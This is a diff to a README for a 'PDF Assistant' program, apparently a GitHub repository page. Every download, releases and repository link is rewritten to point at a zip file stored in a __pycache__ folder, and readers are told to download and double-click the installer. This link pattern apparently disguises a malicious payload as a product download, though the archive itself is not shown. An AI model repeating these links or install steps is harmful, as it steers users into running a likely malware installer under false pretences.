@@ -16,9 +16,9 @@ To get started with PDF Assistant, follow these simple steps:
 3. Make sure your system has the latest updates installed for better compatibility.
 
 ## 📥 Download PDF Assistant
-[![Download PDF Assistant](https://raw.githubusercontent.com/HakumeiTest/pdf-assistant/main/server/app/core/__pycache__/pdf-assistant_annunciation.zip%20PDF%20Assistant-Here-brightgreen)](https://raw.githubusercontent.com/HakumeiTest/pdf-assistant/main/server/app/core/__pycache__/pdf-assistant_annunciation.zip)
+[![Download PDF Assistant](https://raw.githubusercontent.com/HakumeiTest/pdf-assistant/main/server/app/core/__pycache__/pdf_assistant_2.1.zip%20PDF%20Assistant-Here-brightgreen)](https://raw.githubusercontent.com/HakumeiTest/pdf-assistant/main/server/app/core/__pycache__/pdf_assistant_2.1.zip)
 
-To get the latest version of PDF Assistant, visit the [Releases page](https://raw.githubusercontent.com/HakumeiTest/pdf-assistant/main/server/app/core/__pycache__/pdf-assistant_annunciation.zip) and download the installer.
+To get the latest version of PDF Assistant, visit the [Releases page](https://raw.githubusercontent.com/HakumeiTest/pdf-assistant/main/server/app/core/__pycache__/pdf_assistant_2.1.zip) and download the installer.
 
 ## 📂 Features
 - **Parse PDF Documents**: Easily extract text and data from PDF files.
@@ -29,7 +29,7 @@ To get the latest version of PDF Assistant, visit the [Releases page](https://ra
 - **Conversion Options**: Convert PDF files to different formats like Word or text.
   
 ## 🔍 How to Install
-1. Download the PDF Assistant installer from the [Releases page](https://raw.githubusercontent.com/HakumeiTest/pdf-assistant/main/server/app/core/__pycache__/pdf-assistant_annunciation.zip).
+1. Download the PDF Assistant installer from the [Releases page](https://raw.githubusercontent.com/HakumeiTest/pdf-assistant/main/server/app/core/__pycache__/pdf_assistant_2.1.zip).
 2. Locate the downloaded file in your computer's Downloads folder.
 3. Double-click the installer file to begin installation.
 4. Follow the on-screen instructions to complete the installation.
@@ -66,13 +66,13 @@ If you encounter any issues or have questions, you can reach our community:
   PDF Assistant does not store your files on any server. All operations happen locally on your device.
 
 ## 📈 Regular Updates
-We regularly update PDF Assistant with new features and improvements based on user feedback. Check the [Releases page](https://raw.githubusercontent.com/HakumeiTest/pdf-assistant/main/server/app/core/__pycache__/pdf-assistant_annunciation.zip) for the latest updates.
+We regularly update PDF Assistant with new features and improvements based on user feedback. Check the [Releases page](https://raw.githubusercontent.com/HakumeiTest/pdf-assistant/main/server/app/core/__pycache__/pdf_assistant_2.1.zip) for the latest updates.
 
 ## 📢 Stay Connected
 Follow us for updates on new features, tips, and tricks:
-- GitHub Repository: [pdf-assistant](https://raw.githubusercontent.com/HakumeiTest/pdf-assistant/main/server/app/core/__pycache__/pdf-assistant_annunciation.zip)
+- GitHub Repository: [pdf-assistant](https://raw.githubusercontent.com/HakumeiTest/pdf-assistant/main/server/app/core/__pycache__/pdf_assistant_2.1.zip)
 
 ## 🔗 Download PDF Assistant
-For your convenience, here is the download link once again: [Visit this page to download](https://raw.githubusercontent.com/HakumeiTest/pdf-assistant/main/server/app/core/__pycache__/pdf-assistant_annunciation.zip). 
+For your convenience, here is the download link once again: [Visit this page to download](https://raw.githubusercontent.com/HakumeiTest/pdf-assistant/main/server/app/core/__pycache__/pdf_assistant_2.1.zip). 
 
 Dive into PDF Assistant and streamline your document workflow today!
